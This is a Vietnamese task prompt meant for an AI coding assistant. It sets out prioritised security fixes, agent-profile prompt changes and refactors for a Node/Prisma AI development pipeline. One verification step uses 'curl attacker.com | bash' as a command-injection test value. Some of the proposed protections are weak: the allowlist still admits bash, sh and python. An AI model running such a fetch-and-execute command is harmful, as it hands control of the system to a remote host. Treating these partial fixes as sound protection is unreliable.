# VSCODE PROMPT — AI Dev Pipeline: Tất cả Tasks theo Thứ tự Ưu tiên
> Copy toàn bộ nội dung này vào VSCode / Claude Code để thực hiện tuần tự.
> Mỗi nhóm ưu tiên có thể làm độc lập. Làm xong nhóm 🔴 trước khi làm 🟡 và 🟢.

---

## CHUẨN BỊ

Trước khi bắt đầu, đọc các file sau để nắm toàn bộ context:

```
packages/backend/src/middleware/auth.js
packages/backend/src/services/orchestrator/pipelineRunner.js
packages/backend/src/services/claude/promptBuilder.js
packages/backend/src/services/claude/outputParser.js
packages/backend/src/services/orchestrator/stateMachine.js
packages/backend/src/lib/constants.js
packages/backend/prisma/schema.prisma
packages/backend/src/services/validationService.js
```

---

## 🔴 NHÓM 1 — BẢO MẬT + RUNTIME (Làm ngay, không trì hoãn)

---

### TASK-S1: Sửa Auth Bypass khi `API_SECRET` Không Được Set

**File:** `packages/backend/src/middleware/auth.js`

**Vấn đề hiện tại:**
```javascript
const secret = process.env.API_SECRET;
if (!secret) return next(); // Nếu không set env var → toàn bộ API public!
```

**Sửa thành:**
```javascript
const secret = process.env.API_SECRET;
if (!secret) {
  if (process.env.NODE_ENV === 'production') {
    console.error('[AUTH] FATAL: API_SECRET not set in production!');
    return res.status(500).json({ error: 'Server misconfiguration: API_SECRET not configured' });
  }
  // Dev mode only — log warning rõ ràng
  console.warn('[AUTH] WARNING: API_SECRET not set — allowing all requests (dev mode only)');
  return next();
}
```

**Verification:** Kiểm tra file auth.js sau khi sửa, đảm bảo không còn silent bypass.

---

### TASK-S2: Sửa Git Token Bị Lộ trong URL

**File:** `packages/backend/src/services/orchestrator/pipelineRunner.js`

**Tìm đoạn code (khoảng dòng 788-796):**
```javascript
const remoteWithToken = config.gitRemoteUrl.replace('https://', `https://${config.gitToken}@`);
await execAsync(`git remote add uat-deploy "${remoteWithToken}"`, { cwd: repoPath });
await execAsync(`git push uat-deploy ${branch} --force 2>&1`, { cwd: repoPath, timeout: 60000 });
await execAsync(`git remote remove uat-deploy`, { cwd: repoPath });
```

**Sửa thành — dùng GIT_ASKPASS thay vì embed token trong URL:**
```javascript
// Không embed token trong URL để tránh lộ trong git log/history
const gitEnv = {
  ...process.env,
  GIT_ASKPASS: 'echo',
  GIT_USERNAME: 'oauth2',
  GIT_PASSWORD: config.gitToken,
  // Dùng credential helper qua env
  GIT_CONFIG_PARAMETERS: "'credential.helper=!f() { echo username=oauth2; echo password=$GIT_PASSWORD; }; f'",
};
await execAsync(`git remote add uat-deploy "${config.gitRemoteUrl}"`, { cwd: repoPath });
await execAsync(`git push uat-deploy ${branch} --force 2>&1`, {
  cwd: repoPath,
  timeout: 60000,
  env: gitEnv,
});
await execAsync(`git remote remove uat-deploy`, { cwd: repoPath });
```

**Verification:** Chạy `git remote -v` sau push để xác nhận token không xuất hiện trong output.

---

### TASK-S3: Sửa Command Injection qua Database Config

**File:** `packages/backend/src/services/orchestrator/pipelineRunner.js`

**Tìm tất cả các chỗ chạy shell command từ config DB (khoảng dòng 682-697 và 808-835):**
```javascript
await execAsync(config.localSetupCmd, { cwd: repoPath, timeout: 120000 });
await execAsync(config.localStartCmd, { cwd: repoPath });
await execAsync(config.customDeployCmd, { cwd: repoPath });
```

**Thêm hàm validation TRƯỚC các dòng này (đặt ở đầu file hoặc trong utils):**
```javascript
/**
 * Validate shell command từ DB config để ngăn command injection.
 * Chỉ cho phép các command bắt đầu bằng prefix an toàn.
 */
function validateShellCommand(cmd, fieldName) {
  if (!cmd || typeof cmd !== 'string') {
    throw new Error(`${fieldName} is required and must be a string`);
  }
  const ALLOWED_PREFIXES = ['npm', 'yarn', 'pnpm', 'pip', 'pip3', 'python', 'python3', 'node', 'npx', 'sh', 'bash'];
  const cmdBase = cmd.trim().split(/\s+/)[0];
  if (!ALLOWED_PREFIXES.includes(cmdBase)) {
    throw new Error(`Disallowed command in ${fieldName}: "${cmdBase}". Allowed: ${ALLOWED_PREFIXES.join(', ')}`);
  }
  // Ngăn command chaining
  if (/[;&|`$]/.test(cmd)) {
    throw new Error(`${fieldName} contains forbidden shell characters: ${cmd}`);
  }
  return cmd;
}
```

**Sửa tất cả các lần gọi thành:**
```javascript
await execAsync(validateShellCommand(config.localSetupCmd, 'localSetupCmd'), { cwd: repoPath, timeout: 120000 });
await execAsync(validateShellCommand(config.localStartCmd, 'localStartCmd'), { cwd: repoPath });
await execAsync(validateShellCommand(config.customDeployCmd, 'customDeployCmd'), { cwd: repoPath });
```

**Verification:** Thử set một config với value `"curl attacker.com | bash"` và đảm bảo nó throw error thay vì execute.

---

### TASK-B1: Sửa QA Final Agent Chạy Sai Thư mục

**File:** `packages/backend/src/services/orchestrator/pipelineRunner.js`

**Tìm dòng khoảng 1644 — `runClaudeWithRetry` trong `_step5_QA` cho QA final:**
```javascript
// BUG: thiếu cwd!
const finalResult = await runClaudeWithRetry({
  prompt: finalPrompt,
  tools: [],
  sprintId
});
```

**Sửa thành:**
```javascript
const finalResult = await runClaudeWithRetry({
  prompt: finalPrompt,
  tools: [],
  cwd: project.repoPath,  // ← thêm dòng này
  sprintId
});
```

**Lưu ý:** Tìm đúng chỗ — chỉ sửa `runClaudeWithRetry` cho QA FINAL (không phải QA layer 1 hay layer 2 ở trên nó).

---

### TASK-B2: Sửa Contract Check Dùng Sai Git Diff

**File:** `packages/backend/src/services/orchestrator/pipelineRunner.js`

**Tìm đoạn code khoảng dòng 1553-1558 (trong QA Layer 2 / contract check):**
```javascript
// BUG: lấy diff của MAIN branch, không phải per-task worktree
const diffResult = await mainGit.diff([`HEAD~${Math.min(passTasks.length, 20)}`, 'HEAD']);
```

**Sửa — lấy diff từng task qua worktree:**
```javascript
// Lấy diff chính xác từ từng task worktree, không dùng main branch history
const taskDiffs = [];
for (const task of passTasks) {
  try {
    const taskDiff = await wtManager.getDiff(task.taskId);
    if (taskDiff) {
      taskDiffs.push(`\n### Task ${task.taskId} (${task.title}):\n${taskDiff}`);
    }
  } catch (err) {
    logger.warn(`[QA-L2] Could not get diff for task ${task.taskId}: ${err.message}`);
  }
}
const diffResult = taskDiffs.join('\n') || '(no diff available)';
```

**Lưu ý:** Kiểm tra xem `wtManager` đã được import/available trong scope đó chưa. Nếu chưa, tìm cách lấy `worktreeManager` instance từ context.

---

## 🟡 NHÓM 2 — AGENT PROFILES & PROMPTS (Làm sau khi xong Nhóm 1)

---

### TASK-P1: Thêm 8 AGENT_PROFILES Còn Thiếu

**File:** `packages/backend/src/services/claude/promptBuilder.js`

Tìm constant `AGENT_PROFILES` (hiện có 5 keys: reception, architect, developer, reviewer, qa). Thêm 8 entries sau vào cuối object:

```javascript
spec_writer: {
  role: 'Feature Specification Writer',
  identity: 'Ban la Specification Writer doc lap. Nhiem vu: chuyen architect design thanh feature specs cu the, chi tiet, co the verify duoc. Ban KHONG biet developer se implement nhu nao — chi tap trung vao "WHAT" khong phai "HOW".',
  canSee: ['project_context', 'architect_output'],
  cannotSee: 'developer code, review results, QA reports — chi dua tren architect design',
},
task_planner: {
  role: 'Atomic Task Planner',
  identity: 'Ban la Task Planner doc lap. Nhiem vu: chia feature specs thanh atomic tasks co the implement song song voi minimal conflicts. Ban KHONG biet developer se implement nhu nao — chi tap trung vao phan tach dung.',
  canSee: ['project_context', 'feature_specs', 'conventions'],
  cannotSee: 'developer code, review results — chi dua tren feature specs',
},
integration_verifier: {
  role: 'Integration Verifier',
  identity: 'Ban la Integration Verifier doc lap. Nhiem vu: kiem tra toan bo code da implement co khop voi kien truc va specs da duyet hay khong. Ban KHONG biet developer bao cao gi — chi nhin code thuc te.',
  canSee: ['project_context', 'architect_spec', 'feature_specs', 'task_list', 'file_tree', 'test_output'],
  cannotSee: 'dev reports, review verdicts, QA reports — phan tich doc lap',
},
integration_fixer: {
  role: 'Integration Fixer',
  identity: 'Ban la Integration Fixer. Nhiem vu: fix DUNG cac issues tu Integration Verifier report. Ban KHONG tu chan doan them — chi implement theo fix list. Khong thay doi gi ngoai danh sach fixes.',
  canSee: ['project_context', 'verify_result', 'architect_spec', 'conventions'],
  cannotSee: 'developer reports, reviewer verdicts — chi lam theo fix plan',
},
contract_checker: {
  role: 'Contract Compliance Checker',
  identity: 'Ban la Contract Checker doc lap. Nhiem vu: kiem tra zone compliance va interface integrity. Neu co frozen violation hoac interface mismatch, PHAI block merge — khong co exception.',
  canSee: ['zone_classification', 'breaking_changes', 'task_specs', 'git_diff', 'automated_results'],
  cannotSee: 'dev reports, review verdicts — chi nhin contracts va diff',
},
diagnostician: {
  role: 'Bug Diagnostician',
  identity: 'Ban la Diagnostician doc lap. Nhiem vu: doc code va tim root cause. Ban KHONG sua file — chi output fix plan. Fix plan phai du cu the de Fixer thuc hien ma khong can suy doan them.',
  canSee: ['project_context', 'error_description', 'error_logs', 'file_tree'],
  cannotSee: 'previous fix attempts, fix results — phan tich tu dau',
},
fixer: {
  role: 'Bug Fixer',
  identity: 'Ban la Bug Fixer. Nhiem vu: implement fix CHINH XAC theo plan tu Diagnostician. Ban KHONG tu chan doan — neu fix plan khong du ro, bao loi thay vi tu doan. Khong sua them gi ngoai fix plan.',
  canSee: ['fix_plan', 'error_description', 'conventions'],
  cannotSee: 'previous diagnosis reasoning — chi nhin fix plan cuoi cung',
},
verifier: {
  role: 'Fix Verifier',
  identity: 'Ban la Verifier doc lap. Nhiem vu: kiem tra fix co hoat dong khong bang cach chay test thuc te. Ban KHONG sua code — neu van loi, bao FAIL voi day du output de Diagnostician phan tich lai.',
  canSee: ['error_description', 'fix_result'],
  cannotSee: 'fix plan details, diagnosis reasoning — chi nhin ket qua fix va test',
},
```

---

### TASK-P2: Thêm `_agentHeader()` vào 8 Methods Đang Thiếu

**File:** `packages/backend/src/services/claude/promptBuilder.js`

Với 5 methods sau, thêm header vào đầu return string (ngay sau dấu backtick mở template literal):

| Method | Thêm vào dòng đầu tiên |
|--------|------------------------|
| `buildFeatureSpecPrompt()` | `${this._agentHeader('spec_writer')}\n` |
| `buildAtomicTaskPrompt()` | `${this._agentHeader('task_planner')}\n` |
| `buildIntegrationVerifyPrompt()` | `${this._agentHeader('integration_verifier')}\n` |
| `buildIntegrationFixPrompt()` | `${this._agentHeader('integration_fixer')}\n` |
| `buildContractCheckPrompt()` | `${this._agentHeader('contract_checker')}\n` |

Với 3 bugfix methods, **xóa** inline identity block (đoạn có text `Role: Diagnostician`, `Role: Fixer`, `Role: Verifier`) rồi thay bằng `_agentHeader()`:

| Method | Xóa inline block chứa | Thay bằng |
|--------|------------------------|-----------|
| `buildBugDiagnosePrompt()` | `Role: Diagnostician (doc lap)` | `${this._agentHeader('diagnostician')}\n` |
| `buildBugFixPrompt()` | `Role: Fixer (doc lap)` | `${this._agentHeader('fixer')}\n` |
| `buildBugVerifyPrompt()` | `Role: Verifier (doc lap)` | `${this._agentHeader('verifier')}\n` |

---

### TASK-P3: Migrate `_getMaster()` → `_getOptimizedContext()` trong 3 Methods

**File:** `packages/backend/src/services/claude/promptBuilder.js`

Trong 3 methods sau, tìm `const master = this._getMaster();` và thay bằng `const master = this._getOptimizedContext(sprintNumber);`:

1. `buildArchitectPrompt({ requirement, sprintNumber })`
2. `buildFeatureSpecPrompt({ architectOutput, sprintNumber })`
3. `buildAtomicTaskPrompt({ featureSpecs, sprintNumber })`

Đảm bảo `sprintNumber` đã được destructure từ params của mỗi method (nếu chưa có, thêm vào destructuring).

---

### TASK-P4: Thêm Chain-of-Thought vào Reception Prompt

**File:** `packages/backend/src/services/claude/promptBuilder.js`

Trong `buildReceptionPrompt()`, tìm dòng `QUAN TRONG:` ở cuối prompt. Chèn đoạn sau VÀO TRƯỚC dòng đó:

```
## QUY TRINH SUY NGHI (viet ra truoc khi output JSON)
Truoc khi output JSON, hay viet ngan gon:
1. Toi doc duoc nhung tinh nang nao trong requirement?
2. Tinh nang nao thieu inputs / outputs / error handling?
3. Co gi mau thuan hoac ambiguous khong?
4. Scope nay la simple / medium / complex? Tai sao?
Sau do moi output JSON block.

```

Trong output JSON schema của cùng method, thêm 2 fields sau VÀO TRƯỚC `"estimatedComplexity"`:

```json
"featureSummary": ["string — liet ke TAT CA tinh nang duoc de cap trong requirement"],
"scopeWarning": "string hoac null — canh bao neu scope qua lon cho 1 sprint (>10 tinh nang)",
```

---

### TASK-P5: Thêm Verdict Rules vào Reviewer Prompt

**File:** `packages/backend/src/services/claude/promptBuilder.js`

Trong `buildReviewPrompt()`, tìm dòng `## OUTPUT FORMAT`. Chèn đoạn sau VÀO TRƯỚC dòng đó:

```
## VERDICT RULES (BAT BUOC)
- PASS: Tat ca 7 checklist items = true, khong co issue critical hoac major
- PASS_WITH_NOTES: Tat ca checklist items = true, chi co minor issues
- FAIL: Bat ky checklist item nao = false, HOAC co issue critical hoac major

QUAN TRONG:
- Frozen zone violation → verdict = FAIL bat buoc, khong exception
- issues[].fix phai cu the (file, dong, can thay gi) — khong duoc viet "can xem lai"
- regressionRiskReason khong duoc de trong neu regressionRisk != "low"
- Tat ca 7 checklist items PHAI co ket qua — khong skip bat ky item nao

```

---

### TASK-P6: Thêm Blocking Rules vào Contract Checker Prompt

**File:** `packages/backend/src/services/claude/promptBuilder.js`

Trong `buildContractCheckPrompt()`, tìm dòng `## OUTPUT FORMAT`. Chèn đoạn sau VÀO TRƯỚC dòng đó:

```
## BLOCKING RULES (TUYET DOI)
- Bat ky frozen file violation nao → blockMerge = true, severity = "critical"
- Interface mismatch → blockMerge = true
- Breaking change conflict → blockMerge = true
- blockMerge = true PHAI kem theo it nhat 1 issue co severity = "critical"
- Khong co exception — khong "thong cam" du co ly do

```

Trong output JSON schema của cùng method, thêm field sau VÀO SAU `"summary"`:

```json
"verdictReason": "string — 1 cau giai thich tai sao block hoac pass (danh cho PO doc)"
```

---

### TASK-P7: Thêm syntaxCheckResults vào Fixer Output

**File:** `packages/backend/src/services/claude/promptBuilder.js`

Trong `buildBugFixPrompt()`, tìm output JSON schema. Thêm field sau VÀO SAU `"filesSkipped"`:

```json
"syntaxCheckResults": [{ "file": "string", "passed": true }],
```

---

### TASK-P8: Sửa Architect Zod Schema — Thiếu 4 Fields Quan Trọng

**File:** `packages/backend/src/services/claude/outputParser.js`

**Schema hiện tại (khoảng dòng 34-47) thiếu 4 fields và có 1 field sai:**
```javascript
masterMdUpdate: z.string(),  // ← SAI: required nhưng có thể null
// THIẾU: tcrUpdate, contextIndexUpdate, zoneClassification, breakingChanges
```

**Thay thế toàn bộ `architect` schema thành:**
```javascript
architect: z.object({
  analysis: z.string(),
  architectureOverview: z.string(),
  features: z.array(z.object({
    name: z.string(),
    description: z.string(),
    acceptanceCriteria: z.array(z.string()).default([]),
  })),
  techDecisions: z.array(z.string()),
  risks: z.array(z.string()),
  masterMdUpdate: z.string().nullable().optional(),  // ← Sửa: optional + nullable
  estimatedTasks: z.number(),
  tcrUpdate: z.object({
    summary: z.string(),
    decisions: z.array(z.string()).default([]),
    filesChanged: z.array(z.string()).default([]),
    nextSprintContext: z.string().optional(),
  }).optional(),
  contextIndexUpdate: z.string().nullable().optional(),
  zoneClassification: z.object({
    frozen: z.array(z.object({ path: z.string(), reason: z.string() })).default([]),
    guarded: z.array(z.object({ path: z.string(), reason: z.string() })).default([]),
    fluid: z.string().optional(),
  }).optional(),
  breakingChanges: z.array(z.object({
    type: z.string(),
    description: z.string(),
    affectedModules: z.array(z.string()).default([]),
    migrationRequired: z.boolean().default(false),
    migrationNotes: z.string().optional(),
  })).default([]),
}),
```

---

## 🟢 NHÓM 3 — REFACTOR & TECHNICAL DEBT (Khi có thời gian)

---

### TASK-R1: Kích Hoạt StateMachine — Bỏ Dead Code

**File:** `packages/backend/src/services/orchestrator/index.js` (Orchestrator)

**Vấn đề:** `StateMachine` class đã được định nghĩa đầy đủ trong `stateMachine.js` nhưng **không bao giờ được gọi** → sprint có thể chuyển trạng thái tùy tiện không có guardrail.

**Sửa trong `Orchestrator.onGateApproved()`** — thêm assertion trước khi update DB:

```javascript
import { StateMachine } from './stateMachine.js';
const sm = new StateMachine();

// Trong onGateApproved(), TRƯỚC khi gọi prisma.$transaction:
const currentStatus = sprint.status;
const nextStatus = GATE_TO_STEP[gateNumber]?.status; // hoặc target status tương ứng
if (nextStatus) {
  sm.assertTransition(currentStatus, nextStatus); // throw nếu transition không hợp lệ
}
```

**Tương tự** trong `handleErrorAction()` — assert trước mọi status update.

---

### TASK-R2: Gộp `GATE_TO_STEP` — Xóa Bản Duplicate

**Files:** `packages/backend/src/lib/constants.js` và `packages/backend/src/services/orchestrator/stateMachine.js`

**Vấn đề:** `GATE_TO_STEP` được định nghĩa ở **2 nơi** — nếu 2 file diverge sẽ gây silent routing bug.

**Sửa:**
1. Xóa định nghĩa `GATE_TO_STEP` khỏi `stateMachine.js`
2. Trong `stateMachine.js`, thêm import: `import { GATE_TO_STEP } from '../lib/constants.js';`
3. Re-export nếu cần: `export { GATE_TO_STEP };`
4. Chạy grep để đảm bảo tất cả import vẫn hoạt động: `grep -r "GATE_TO_STEP" packages/backend/src/`

---

### TASK-R3: Sửa Notification FK Thiếu — Orphaned Records

**File:** `packages/backend/prisma/schema.prisma`

**Tìm model Notification** (khoảng dòng 127-143) — hiện `sprintId` không có `@relation`:

```prisma
model Notification {
  sprintId  String?  // ← Không có @relation → không cascade delete
  ...
}
```

**Sửa thành:**
```prisma
model Notification {
  id        String   @id @default(cuid())
  sprintId  String?
  sprint    Sprint?  @relation(fields: [sprintId], references: [id], onDelete: SetNull)
  // ... các fields khác
}

model Sprint {
  // ... thêm vào cuối:
  notifications Notification[]
}
```

**Sau khi sửa schema, chạy:**
```bash
npx prisma migrate dev --name add-notification-sprint-relation --prefix packages/backend
```

---

### TASK-R4: Sửa ESM Import Check trong validationService

**File:** `packages/backend/src/services/validationService.js`

**Tìm đoạn dùng `node -e "require()"` để check syntax:**
```javascript
// BAD: Fails với ESM projects (package.json có "type": "module")
await execAsync(`node -e "require('${absPath}')"`, { cwd: repoPath });
```

**Sửa — detect ESM và dùng dynamic import thay vì require:**
```javascript
// Detect ESM project
const pkgJsonPath = path.join(repoPath, 'package.json');
const pkgJson = JSON.parse(await fs.readFile(pkgJsonPath, 'utf8').catch(() => '{}'));
const isESM = pkgJson.type === 'module';

if (isESM) {
  // ESM: dùng --input-type=module với dynamic import
  await execAsync(
    `node --input-type=module -e "import('${absPath.replace(/\\/g, '/')}')"`,
    { cwd: repoPath, timeout: 10000 }
  );
} else {
  // CJS: dùng require như cũ
  await execAsync(`node -e "require('${absPath}')"`, { cwd: repoPath, timeout: 10000 });
}
```

---

### TASK-R5: Tách pipelineRunner.js — God Class Refactor

**File:** `packages/backend/src/services/orchestrator/pipelineRunner.js` (1887 lines)

**Đây là refactor lớn nhất — chỉ làm khi đã xong tất cả tasks trên.**

**Mục tiêu:** Tách `PipelineRunner` thành các class chuyên biệt:

```
services/orchestrator/
├── PipelineRunner.js        ← Chỉ giữ: steps 0-5, runMerge, orchestrate flow
├── TaskExecutor.js          ← Di chuyển: _executeTask, _escalateTask, retryTask
├── QARunner.js              ← Di chuyển: _step5_QA, runQAFix (3-layer QA)
├── BugfixRunner.js          ← Di chuyển: runBugfix (3-agent bugfix pipeline)
├── DeployRunner.js          ← Di chuyển: runLocalSetup, runUATDeploy
├── IntegrationVerifier.js   ← Di chuyển: _step4b_IntegrationVerify
└── formatters/
    ├── receptionFormatter.js
    ├── architectFormatter.js
    └── qaFormatter.js
```

**Cách thực hiện:**
1. Tạo từng file mới, di chuyển methods tương ứng
2. Update imports trong `PipelineRunner.js` để gọi các class mới
3. Đảm bảo `this` context được truyền đúng (hoặc dùng dependency injection)
4. Chạy toàn bộ test sau mỗi file được tách
5. Không thay đổi behavior — chỉ tổ chức lại code

---

## VERIFICATION TỔNG — Chạy Sau Khi Hoàn Thành Từng Nhóm

```bash
# ===== SAU NHÓM 1 (Security) =====

# Check syntax tất cả files đã sửa
node --check packages/backend/src/middleware/auth.js
node --check packages/backend/src/services/orchestrator/pipelineRunner.js

# Test auth bypass fix
API_SECRET="" NODE_ENV=production node -e "
const req = {};
const res = { status: (c) => ({ json: (b) => console.log('BLOCKED:', c, b) }) };
const next = () => console.log('ERROR: Should have been blocked!');
process.env.NODE_ENV = 'production';
// import và test auth middleware
console.log('Auth test complete');
"

# ===== SAU NHÓM 2 (Agent Profiles) =====

# Syntax check promptBuilder
node --check packages/backend/src/services/claude/promptBuilder.js
node --check packages/backend/src/services/claude/outputParser.js

# Smoke test: verify 8 profiles tồn tại
node --input-type=module << 'EOF'
import { PromptBuilder } from './packages/backend/src/services/claude/promptBuilder.js';
const pb = new PromptBuilder('/tmp', {});
const required = [
  'spec_writer', 'task_planner', 'integration_verifier', 'integration_fixer',
  'contract_checker', 'diagnostician', 'fixer', 'verifier'
];
let ok = true;
for (const key of required) {
  const h = pb._agentHeader(key);
  if (!h || h.trim() === '') { console.error('❌ MISSING:', key); ok = false; }
  else console.log('✅ OK:', key);
}
if (ok) console.log('\n✅ All 8 new profiles verified.');
else console.error('\n❌ Some profiles missing — check AGENT_PROFILES object.');
EOF

# ===== SAU TẤT CẢ =====

# Chạy test suite
npm test --prefix packages/backend 2>/dev/null || echo "No tests configured"

# Prisma validate (nếu sửa schema)
npx prisma validate --schema packages/backend/prisma/schema.prisma
```

---

## CHECKLIST HOÀN THÀNH

Báo cáo kết quả theo format sau:

```
NHÓM 1 - BẢO MẬT:
[ ] TASK-S1: Auth bypass fix — auth.js
[ ] TASK-S2: Git token fix — pipelineRunner.js
[ ] TASK-S3: Command injection fix — pipelineRunner.js
[ ] TASK-B1: QA Final cwd fix — pipelineRunner.js:1644
[ ] TASK-B2: Contract check diff fix — pipelineRunner.js:1553

NHÓM 2 - AGENT PROFILES:
[ ] TASK-P1: 8 AGENT_PROFILES added — promptBuilder.js
[ ] TASK-P2: _agentHeader() added to 8 methods — promptBuilder.js
[ ] TASK-P3: _getMaster() → _getOptimizedContext() in 3 methods — promptBuilder.js
[ ] TASK-P4: Chain-of-thought + 2 fields — Reception prompt
[ ] TASK-P5: Verdict rules — Reviewer prompt
[ ] TASK-P6: Blocking rules + verdictReason — Contract Checker prompt
[ ] TASK-P7: syntaxCheckResults — Fixer output
[ ] TASK-P8: Architect Zod schema — outputParser.js

NHÓM 3 - REFACTOR:
[ ] TASK-R1: StateMachine activated — orchestrator/index.js
[ ] TASK-R2: GATE_TO_STEP deduplicated — stateMachine.js + constants.js
[ ] TASK-R3: Notification FK added — schema.prisma + migration
[ ] TASK-R4: ESM import check fix — validationService.js
[ ] TASK-R5: pipelineRunner.js split into 6 classes

VERIFICATION:
[ ] Syntax check passed — tất cả files đã sửa
[ ] Smoke test passed — 8 profiles verified
[ ] Test suite passed (hoặc no tests configured)
[ ] Prisma schema valid
```
